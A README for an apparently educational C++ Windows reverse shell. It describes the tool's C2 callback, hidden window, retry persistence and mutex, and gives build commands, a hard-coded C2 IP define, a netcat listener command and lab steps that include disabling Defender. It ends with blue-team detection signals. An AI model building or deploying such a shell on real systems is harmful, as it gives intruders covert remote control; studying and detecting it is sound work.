# Windows Reverse Shell (Educational)

> ⚠️ **DISCLAIMER**
> This project is provided **strictly for educational purposes** — for learning how
> TCP reverse shells work, how Winsock2 sockets interact with process I/O redirection,
> and how defenders can detect such behavior.
>
> **Do NOT** use this code on any system you do not own or do not have explicit
> written permission to test. Unauthorized use is illegal in most jurisdictions.
> The author takes no responsibility for misuse.

---

## 📖 Overview

A minimal Windows reverse shell implemented in C++ using the Win32 API.
It connects back to a listener (e.g. `nc -lvnp 4444`), then spawns `cmd.exe`
with `stdin` / `stdout` / `stderr` redirected to the socket — effectively
giving the operator an interactive shell over TCP.

This repo exists to demonstrate:

- Basic Winsock2 client socket programming
- `STARTUPINFO` + `CreateProcessA` handle inheritance for I/O redirection
- Simple persistence loop with retry
- Single-instance enforcement via named mutex

---

## 🧩 Features

| Feature | Description |
|---|---|
| TCP reverse connection | Connects to a hard-coded C2 IP/port |
| I/O redirection | `cmd.exe` stdin/stdout/stderr bound to socket |
| Hidden window | `SW_HIDE` — no visible console |
| Auto-retry | Reconnects every 10 seconds if connection drops |
| Single instance | Named mutex prevents duplicate execution |
| Socket timeouts | 5s send/recv timeout to avoid hangs |

---

## ⚙️ Build

### Requirements
- Windows 10/11
- MSVC (Visual Studio 2019/2022) or MinGW-w64
- `ws2_32.lib` (linked automatically via `#pragma comment`)

### MSVC (Developer Command Prompt)

```cmd
cl /EHsc revshell.cpp /link ws2_32.lib
```

### MinGW-w64

```bash
x86_64-w64-mingw32-g++ revshell.cpp -o revshell.exe -lws2_32 -mwindows
```

---

## 🚀 Usage (Lab Only)

1. **Set your listener IP/port** in the source:
   ```c
   #define C2_IP   "192.168.132.132"
   #define C2_PORT 4444
   ```

2. **Start a listener** on the attacker VM (Linux):
   ```bash
   nc -lvnp 4444
   ```

3. **Run the binary** on the target Windows VM inside your isolated lab.

4. You should receive an interactive `cmd.exe` prompt.

---

## 🧪 Recommended Lab Setup

- Two VMs on an **isolated host-only / NAT network**:
  - Attacker: Kali Linux
  - Victim: Windows 10 (with Defender disabled or exclusions set)
- **Never** run this on a production or public network.

---

## 🔍 Detection Notes (Blue Team)

If you're studying this from a defensive angle, common detection signals include:

- Outbound TCP connection from `cmd.exe` or an unsigned process on unusual ports
- `CreateProcess` with inherited socket handles (`STARTF_USESTDHANDLES`)
- `WinMain` + `-mwindows` binaries with no visible UI
- Named mutex creation patterns (`Global\RevShellInstance`)
- Sysmon Event ID 3 (network connect) correlated with Event ID 1 (process create)

---

## 📂 File Structure

```
.
├── reverseshell.c   # main source
└── README.md
```

---

## ⚖️ License

MIT — for **educational use only**. See disclaimer above.

---

## 🧠 Further Reading

- [Microsoft Docs — Creating a Basic Winsock Application](https://learn.microsoft.com/en-us/windows/win32/winsock/creating-a-basic-winsock-application)
- [Microsoft Docs — CreateProcessA](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa)
- [MITRE ATT&CK — T1059.003 (Windows Command Shell)](https://attack.mitre.org/techniques/T1059/003/)
- [MITRE ATT&CK — T1071.001 (Web Protocols / C2)](https://attack.mitre.org/techniques/T1071/001/)
